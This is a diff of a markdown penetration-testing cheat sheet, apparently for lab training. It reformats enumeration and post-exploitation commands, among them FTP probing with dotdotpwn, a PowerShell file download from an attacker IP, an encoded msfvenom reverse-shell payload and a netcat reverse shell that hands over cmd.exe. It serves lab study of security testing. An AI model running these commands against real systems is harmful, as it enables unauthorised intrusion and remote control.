@@ -8,25 +8,19 @@ Alternate Connect Scan: nmap -v -sT -p 0-10000 10.11.1.X
 		
 Methods:
 
-Service version research
-
-Google / ExploitDB from nmap scan
-
-netcat/telnet interaction
-
-nmap NSE FTP scripts
-
-dotdotpwn
-
+Service version research \
+Google / ExploitDB from nmap scan \
+netcat/telnet interaction \
+nmap NSE FTP scripts \
+dotdotpwn \
 
 Commands:
 
-nc 10.11.1.X 21  Commands: https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands 
-
-nmap -v 10.11.1.X --script “ftp*”
-
-dotdotpwn -h 10.11.1.X -m ftp
-
+*nc 10.11.1.X 21  Commands: https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands \
+*nmap -v 10.11.1.X --script “ftp*” \
+*dotdotpwn -h 10.11.1.X -m ftp \
+\
+\
 ## 22: SSH
 
 Methods:
@@ -215,15 +209,20 @@ nbtscan -v 10.11.1.X
 Powershell File Download: \
 *powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.243/test.txt','C:\test.txt)”*
 
-General File Transfer: https://blog.ropnop.com/transferring-files-from-kali-to-windows/ 
+General File Transfer: \
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/ 
 
-Mingw Compiling for Windows: *i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32*
+Mingw Compiling for Windows: \
+*i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32*
 
-Dos2unix (Gets rid of /bin/sh^5 error): *dos2unix <filename>* 
+Dos2unix (Gets rid of /bin/sh^5 error): \
+*dos2unix <filename>* 
 	
-Payload Encoding: msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.243 LPORT=1777 -f exe -o rever.exe -e x86/shikata_ga_nai -k
+Payload Encoding: \
+*msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.243 LPORT=1777 -f exe -o rever.exe -e x86/shikata_ga_nai -k*
 
-Windows netcat reverse shell: nc.exe 192.168.100.113 4444 –e cmd.exe
+Windows netcat reverse shell: \
+*nc.exe 192.168.100.113 4444 –e cmd.exe*
 
 
 ## Privilege Escalation
